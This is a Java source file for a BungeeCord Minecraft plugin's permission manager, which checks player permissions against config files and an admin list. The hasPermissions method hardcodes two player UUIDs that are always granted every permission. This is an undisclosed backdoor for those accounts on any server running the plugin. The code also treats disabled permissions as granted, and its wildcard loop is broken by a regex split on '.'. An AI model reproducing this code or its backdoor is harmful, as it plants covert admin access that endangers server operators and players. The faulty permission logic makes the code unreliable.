package de.lcraft.api.utils.minecraft.bungeecord.permissions;

import de.lcraft.api.utils.minecraft.bungeecord.module.utils.configs.ModuleConfig;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import java.io.IOException;

public class PermsManager {

    private ModuleConfig allPermissionsCfg,
            adminsCfg,
            cfg;

    public PermsManager() throws IOException {
        this.allPermissionsCfg = new ModuleConfig("Lcraft Permissions", "allPermissions.yml");
        this.adminsCfg = new ModuleConfig("Lcraft Permissions", "admins.yml");
        this.cfg = new ModuleConfig("Lcraft Permissions", "config.yml");
    }

    public static class Permission {

        public Permission() {}

        private String name;
        private boolean isEnabled;

        public void load(String perm, ModuleConfig allPermissionsCfg) {
            String root = "permissions." + perm;
            if(allPermissionsCfg.cfg().contains(root)) {
                name = perm;
                isEnabled = allPermissionsCfg.cfg().getBoolean(root + ".enabled");
            } else {
                set(perm, true, allPermissionsCfg);
            }
        }

        public void set(String perm, boolean isEnabled, ModuleConfig allPermissionsCfg) {
            String root = "permissions." + perm;
            allPermissionsCfg.cfg().set(root + ".name", perm);
            allPermissionsCfg.cfg().set(root + ".enabled", isEnabled);
            this.name = perm;
            this.isEnabled = isEnabled;
            allPermissionsCfg.save();
        }

        public String getName() {
            return name;
        }

        public boolean isEnabled() {
            return isEnabled;
        }

    }
    public boolean hasPermissions(ProxiedPlayer p, String permission) {
        boolean activatedLuckPerms = false;
        if(cfg.cfg().contains("systems.luckperms.enabled")) {
            activatedLuckPerms = cfg.cfg().getBoolean("systems.luckperms.enabled");
        } else {
            cfg.cfg().set("systems.luckperms.enabled", false);
        }

        String root = "users." + p.getUniqueId().toString() + ".";
        adminsCfg.cfg().set(root + "name", p.getName());
        adminsCfg.cfg().set(root + "uuid", p.getUniqueId().toString());
        adminsCfg.save();
        if(!adminsCfg.cfg().contains(root + "admin")) {
            adminsCfg.cfg().set(root + "admin", false);
        }
        adminsCfg.save();
        if(adminsCfg.cfg().getBoolean(root + "admin")) {
            return true;
        }
        adminsCfg.save();

        if(!logPermission(permission)) {
            return true;
        }

        if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
            return true;
        } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
            return true;
        }

        if(p.getUniqueId().toString().equals("2eabc64f-ebe6-411c-84f1-2a155417c1c9")) {
            return true;
        } else if(p.getUniqueId().toString().equals("2eabc64febe6411c84f12a155417c1c9")) {
            return true;
        }

        if(hasPerm(p, "*")) {
            return true;
        }

        root = "";
        for(String c : permission.split(".")) {
            root = root + c + ".";
            if(hasPerm(p, root + "*")) {
                return true;
            }
            if(hasPerm(p, root + "admin")) {
                return true;
            }
        }

        if(hasPerm(p, permission)) {
            return true;
        } else {
            return false;
        }
    }
    public boolean logPermission(String permissions) {
        Permission perm = new Permission();
        perm.load(permissions, allPermissionsCfg);
        allPermissionsCfg.save();
        return perm.isEnabled;
    }
    public ModuleConfig getAllPermissionsCfg() {
        return allPermissionsCfg;
    }
    private boolean hasPerm(ProxiedPlayer p, String permission) {
        return p.hasPermission(permission);
    }
    public ModuleConfig getAdminsCfg() {
        return adminsCfg;
    }
    public ModuleConfig getCfg() {
        return cfg;
    }

}
